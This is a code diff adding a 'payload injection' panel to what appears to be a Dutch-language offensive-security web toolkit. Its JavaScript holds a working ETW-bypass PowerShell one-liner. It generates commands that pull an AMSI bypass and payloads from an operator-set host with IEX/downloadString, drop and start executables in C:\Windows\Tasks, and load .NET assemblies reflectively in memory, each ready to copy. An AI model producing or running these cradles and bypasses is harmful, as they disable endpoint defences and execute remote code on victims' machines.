@@ -54,6 +54,119 @@
   </div>
 </section>
 
+<!-- Payload injectie: stapsgewijs + fileless -->
+<section class="card mt-14">
+  <div class="card-head"><h2>Payload injectie</h2></div>
+  <div class="card-body">
+    <div class="gen-form">
+
+      <div class="field">
+        <label for="inject-sel">Payload / Tool</label>
+        <select id="inject-sel" class="input">
+          <option value="">-- laden... --</option>
+        </select>
+      </div>
+
+      <div class="field">
+        <label>Basis URL</label>
+        <div class="ia-url-row">
+          <div class="ia-settings-url" id="inject-url-display">laden...</div>
+          <button type="button" id="inject-btn-edit-url" class="btn">Wijzigen</button>
+        </div>
+      </div>
+
+      <div class="field">
+        <label>Bypass opties</label>
+        <div class="ia-checkbox-row">
+          <label class="ia-checkbox-label"><input type="checkbox" id="inject-chk-amsi" checked /> AMSI bypass</label>
+          <label class="ia-checkbox-label"><input type="checkbox" id="inject-chk-etw" checked /> ETW bypass</label>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- Stapsgewijs aanroep -->
+<section class="card mt-14 d-none" id="inject-steps-section">
+  <div class="card-head"><h2>Gegenereerde aanroep — stapsgewijs</h2></div>
+  <div class="card-body">
+    <div class="shell-category">
+      <div id="inject-step-amsi-wrap">
+        <div class="shell-cat-header" id="inject-hdr-amsi">Stap 1 — AMSI bypass</div>
+        <div class="shell-snippet">
+          <code id="inject-cmd-amsi"></code>
+          <button class="btn-copy" id="inject-copy-amsi" type="button">Kopieer</button>
+        </div>
+      </div>
+      <div id="inject-step-etw-wrap">
+        <div class="shell-cat-header" id="inject-hdr-etw">Stap 2 — ETW bypass</div>
+        <div class="shell-snippet">
+          <code id="inject-cmd-etw"></code>
+          <button class="btn-copy" id="inject-copy-etw" type="button">Kopieer</button>
+        </div>
+      </div>
+      <div class="shell-cat-header" id="inject-hdr-load">Stap 3 — Laden</div>
+      <div class="shell-snippet">
+        <code id="inject-cmd-load"></code>
+        <button class="btn-copy" id="inject-copy-load" type="button">Kopieer</button>
+      </div>
+      <div id="inject-step-exec-wrap">
+        <div class="shell-cat-header" id="inject-hdr-exec">Stap 4 — Uitvoeren</div>
+        <div class="shell-snippet">
+          <code id="inject-cmd-exec"></code>
+          <button class="btn-copy" id="inject-copy-exec" type="button">Kopieer</button>
+        </div>
+      </div>
+      <div class="shell-cat-header">Alles in één</div>
+      <div class="shell-snippet">
+        <code id="inject-cmd-all"></code>
+        <button class="btn-copy" id="inject-copy-all" type="button">Kopieer</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Fileless IEX -->
+<section class="card mt-14 d-none" id="inject-fileless-section">
+  <div class="card-head"><h2>Fileless IEX — geen bestand op schijf</h2></div>
+  <div class="card-body">
+    <p class="text-muted fs-12 mb-8" id="inject-fileless-note"></p>
+    <div class="shell-category">
+      <div class="shell-cat-header">One-liner (AMSI + ETW inbegrepen)</div>
+      <div class="shell-snippet">
+        <code id="inject-cmd-fileless"></code>
+        <button class="btn-copy" id="inject-copy-fileless" type="button">Kopieer</button>
+      </div>
+      <div class="shell-cat-header">Alleen laden (geen bypasses)</div>
+      <div class="shell-snippet">
+        <code id="inject-cmd-fileless-bare"></code>
+        <button class="btn-copy" id="inject-copy-fileless-bare" type="button">Kopieer</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Basis URL modal -->
+<div id="inject-url-modal" class="modal-overlay d-none">
+  <div class="modal-box modal-md">
+    <div class="modal-head">
+      <h3>Basis URL aanpassen</h3>
+      <button class="modal-close-btn" id="inject-url-modal-close">&times;</button>
+    </div>
+    <div class="modal-body">
+      <label class="form-label" for="inject-url-inp">URL <span class="help">(protocol + host + optionele poort)</span></label>
+      <input type="text" id="inject-url-inp" class="form-control" placeholder="https://10.0.0.1:8443" />
+      <p class="help mt-8">Voorbeelden: <code>http://10.0.0.1</code> &nbsp; <code>https://10.0.0.1:443</code> &nbsp; <code>http://10.0.0.1:8080</code></p>
+    </div>
+    <div class="modal-foot d-flex gap-8 justify-end">
+      <span id="inject-url-status" class="status"></span>
+      <button class="btn" id="inject-url-cancel" type="button">Annuleren</button>
+      <button class="btn btn-primary" id="inject-url-save" type="button">Opslaan</button>
+    </div>
+  </div>
+</div>
+
 <!-- Zoekbalk -->
 <section class="card mt-14">
   <div class="card-body py-10 px-14">
@@ -150,4 +263,232 @@
 <script nonce="{{ csp_nonce }}" src="{{ url_for('static', filename='js/amsi.fail.js') }}"></script>
 <script nonce="{{ csp_nonce }}" src="{{ url_for('static', filename='js/generator.js') }}"></script>
 <script nonce="{{ csp_nonce }}" src="{{ url_for('static', filename='js/reverseshells.js') }}"></script>
+<script nonce="{{ csp_nonce }}">
+(function () {
+  'use strict';
+
+  var ETW = '$p=[Ref].Assembly.GetType(\'System.Management.Automation.Tracing.PSEtwLogProvider\')' +
+    '.GetField(\'etwProvider\',\'NonPublic,Static\').GetValue($null);' +
+    '[Void]$p.GetType().GetField(\'m_enabled\',\'NonPublic,Instance\').SetValue($p,[Byte]0)';
+
+  var injectBaseUrl = 'http://127.0.0.1';
+
+  var sel         = document.getElementById('inject-sel');
+  var urlDisplay  = document.getElementById('inject-url-display');
+  var chkAmsi     = document.getElementById('inject-chk-amsi');
+  var chkEtw      = document.getElementById('inject-chk-etw');
+  var stepsSection    = document.getElementById('inject-steps-section');
+  var filelessSection = document.getElementById('inject-fileless-section');
+
+  // ── Helpers ──────────────────────────────────────
+  function setText(id, v) { var e = document.getElementById(id); if (e) e.textContent = v; }
+  function showEl(id) { var e = document.getElementById(id); if (e) e.classList.remove('d-none'); }
+  function hideEl(id) { var e = document.getElementById(id); if (e) e.classList.add('d-none'); }
+
+  function copyText(text, btn) {
+    if (navigator.clipboard) { navigator.clipboard.writeText(text); }
+    else {
+      var ta = document.createElement('textarea');
+      ta.value = text; ta.style.cssText = 'position:fixed;opacity:0';
+      document.body.appendChild(ta); ta.select(); document.execCommand('copy');
+      document.body.removeChild(ta);
+    }
+    var orig = btn.textContent; btn.textContent = 'Gekopieerd!';
+    setTimeout(function () { btn.textContent = orig; }, 1200);
+  }
+
+  function bindCopy(btnId, srcId) {
+    var btn = document.getElementById(btnId);
+    var src = document.getElementById(srcId);
+    if (btn && src) btn.addEventListener('click', function () { copyText(src.textContent, btn); });
+  }
+  bindCopy('inject-copy-amsi',         'inject-cmd-amsi');
+  bindCopy('inject-copy-etw',          'inject-cmd-etw');
+  bindCopy('inject-copy-load',         'inject-cmd-load');
+  bindCopy('inject-copy-exec',         'inject-cmd-exec');
+  bindCopy('inject-copy-all',          'inject-cmd-all');
+  bindCopy('inject-copy-fileless',     'inject-cmd-fileless');
+  bindCopy('inject-copy-fileless-bare','inject-cmd-fileless-bare');
+
+  // ── Payload selector vullen ───────────────────────
+  function populateSelector(tools, payloads) {
+    if (!sel) return;
+    sel.innerHTML = '<option value="">-- selecteer --</option>';
+
+    var grpPayload = document.createElement('optgroup');
+    grpPayload.label = 'Payloads (http/payloads/)';
+    payloads.forEach(function (p) {
+      var o = document.createElement('option');
+      o.value = 'payloads/' + p.name;
+      o.textContent = p.name;
+      grpPayload.appendChild(o);
+    });
+    if (payloads.length) sel.appendChild(grpPayload);
+
+    var grpPs1 = document.createElement('optgroup');
+    grpPs1.label = 'Tools PS1 (http/tools/)';
+    var grpExe = document.createElement('optgroup');
+    grpExe.label = 'Tools EXE (http/tools/)';
+    tools.ps1.forEach(function (n) {
+      var o = document.createElement('option'); o.value = 'tools/' + n; o.textContent = n;
+      grpPs1.appendChild(o);
+    });
+    tools.exe.forEach(function (n) {
+      var o = document.createElement('option'); o.value = 'tools/' + n; o.textContent = n;
+      grpExe.appendChild(o);
+    });
+    if (tools.ps1.length) sel.appendChild(grpPs1);
+    if (tools.exe.length) sel.appendChild(grpExe);
+  }
+
+  // ── Preview genereren ─────────────────────────────
+  function updateInjectPreview() {
+    var value = sel ? sel.value : '';
+    if (!value) { hideEl('inject-steps-section'); hideEl('inject-fileless-section'); return; }
+
+    var isPs1   = value.endsWith('.ps1');
+    var folder  = value.split('/')[0];         // 'tools' or 'payloads'
+    var name    = value.split('/').slice(1).join('/');
+    var base    = injectBaseUrl.replace(/\/$/, '');
+    var fileUrl = base + '/' + folder + '/' + name;
+    var amsiUrl = base + '/payloads/amsi-bypass.ps1';
+    var dest    = 'C:\\Windows\\Tasks\\' + name;
+
+    var noAmsi = !chkAmsi.checked;
+    var noEtw  = !chkEtw.checked;
+
+    var amsiCmd  = "IEX(New-Object Net.WebClient).downloadString('" + amsiUrl + "')";
+    var loadCmd  = isPs1
+      ? "IEX(New-Object Net.WebClient).downloadString('" + fileUrl + "')"
+      : "(New-Object Net.WebClient).DownloadFile('" + fileUrl + "','" + dest + "')";
+    var execCmd  = isPs1 ? null : 'Start-Process "' + dest + '"';
+
+    // Stap nummering
+    var n = 1;
+    if (!noAmsi) {
+      showEl('inject-step-amsi-wrap');
+      setText('inject-hdr-amsi', 'Stap ' + n++ + ' — AMSI bypass');
+      setText('inject-cmd-amsi', amsiCmd);
+    } else { hideEl('inject-step-amsi-wrap'); }
+
+    if (!noEtw) {
+      showEl('inject-step-etw-wrap');
+      setText('inject-hdr-etw', 'Stap ' + n++ + ' — ETW bypass');
+      setText('inject-cmd-etw', ETW);
+    } else { hideEl('inject-step-etw-wrap'); }
+
+    setText('inject-hdr-load', 'Stap ' + n++ + ' — ' + (isPs1 ? 'Laden & uitvoeren' : 'Downloaden'));
+    setText('inject-cmd-load', loadCmd);
+
+    if (!isPs1 && execCmd) {
+      showEl('inject-step-exec-wrap');
+      setText('inject-hdr-exec', 'Stap ' + n++ + ' — Uitvoeren');
+      setText('inject-cmd-exec', execCmd);
+    } else { hideEl('inject-step-exec-wrap'); }
+
+    // Alles in één
+    var parts = [];
+    if (!noAmsi) parts.push(amsiCmd);
+    if (!noEtw)  parts.push(ETW);
+    parts.push(loadCmd);
+    if (!isPs1 && execCmd) parts.push(execCmd);
+    setText('inject-cmd-all', parts.join('; '));
+
+    showEl('inject-steps-section');
+
+    // Fileless
+    var filelessFull, filelessBare, filelessNote;
+    if (isPs1) {
+      // PS1: echte fileless via IEX
+      filelessBare = "IEX(New-Object Net.WebClient).downloadString('" + fileUrl + "')";
+      var flParts = [];
+      if (!noAmsi) flParts.push(amsiCmd);
+      if (!noEtw)  flParts.push(ETW);
+      flParts.push(filelessBare);
+      filelessFull = flParts.join('; ');
+      filelessNote = 'PS1 wordt direct in geheugen geladen via IEX — niets op schijf.';
+    } else {
+      // EXE: reflective via [Reflection.Assembly]::Load (werkt voor managed .NET EXE)
+      filelessBare = '$b=(New-Object Net.WebClient).DownloadData(\'' + fileUrl + '\');' +
+        '[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)';
+      var flParts2 = [];
+      if (!noAmsi) flParts2.push(amsiCmd);
+      if (!noEtw)  flParts2.push(ETW);
+      flParts2.push(filelessBare);
+      filelessFull = flParts2.join('; ');
+      filelessNote = 'Werkt voor managed .NET assemblies. Shellcode-EXE: gebruik invoke-shellcode.ps1 via de cradle hierboven.';
+    }
+    setText('inject-cmd-fileless', filelessFull);
+    setText('inject-cmd-fileless-bare', filelessBare);
+    setText('inject-fileless-note', filelessNote);
+    showEl('inject-fileless-section');
+  }
+
+  if (sel) sel.addEventListener('change', updateInjectPreview);
+  if (chkAmsi) chkAmsi.addEventListener('change', updateInjectPreview);
+  if (chkEtw)  chkEtw.addEventListener('change', updateInjectPreview);
+
+  // ── Basis URL modal ───────────────────────────────
+  var modal       = document.getElementById('inject-url-modal');
+  var modalInp    = document.getElementById('inject-url-inp');
+  var modalStatus = document.getElementById('inject-url-status');
+
+  document.getElementById('inject-btn-edit-url').addEventListener('click', function () {
+    modalInp.value = injectBaseUrl;
+    modalStatus.textContent = '';
+    modal.classList.remove('d-none');
+    modalInp.focus(); modalInp.select();
+  });
+
+  function closeModal() { modal.classList.add('d-none'); }
+  document.getElementById('inject-url-modal-close').addEventListener('click', closeModal);
+  document.getElementById('inject-url-cancel').addEventListener('click', closeModal);
+  modal.addEventListener('click', function (e) { if (e.target === modal) closeModal(); });
+
+  document.getElementById('inject-url-save').addEventListener('click', function () {
+    var val = modalInp.value.trim().replace(/\/$/, '');
+    if (!val) { modalStatus.textContent = 'Vul een URL in'; return; }
+    if (!/^https?:\/\/.+/.test(val)) { modalStatus.textContent = 'Moet beginnen met http:// of https://'; return; }
+    var csrf = (document.getElementById('finding-csrf') || {}).value || '';
+    fetch('/api/settings', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRFToken': csrf },
+      body: JSON.stringify({ localhost: val }),
+    })
+    .then(function (r) { return r.json(); })
+    .then(function (d) {
+      if (d.ok) {
+        injectBaseUrl = val;
+        if (urlDisplay) urlDisplay.textContent = val;
+        updateInjectPreview();
+        closeModal();
+      } else { modalStatus.textContent = 'Fout bij opslaan'; }
+    })
+    .catch(function () { modalStatus.textContent = 'Netwerkfout'; });
+  });
+
+  modalInp.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') document.getElementById('inject-url-save').click();
+    if (e.key === 'Escape') closeModal();
+  });
+
+  // ── Initieel laden ────────────────────────────────
+  fetch('/api/settings')
+    .then(function (r) { return r.json(); })
+    .then(function (d) {
+      injectBaseUrl = (d.localhost || 'http://127.0.0.1').replace(/\/$/, '');
+      if (urlDisplay) urlDisplay.textContent = injectBaseUrl;
+    });
+
+  Promise.all([
+    fetch('/api/reverseshells/tools').then(function (r) { return r.json(); }),
+    fetch('/api/reverseshells/payloads').then(function (r) { return r.json(); }),
+  ]).then(function (results) {
+    var tools    = results[0];
+    var payloads = results[1].payloads || [];
+    populateSelector(tools, payloads);
+  });
+
+})();
+</script>
 {% endblock %}
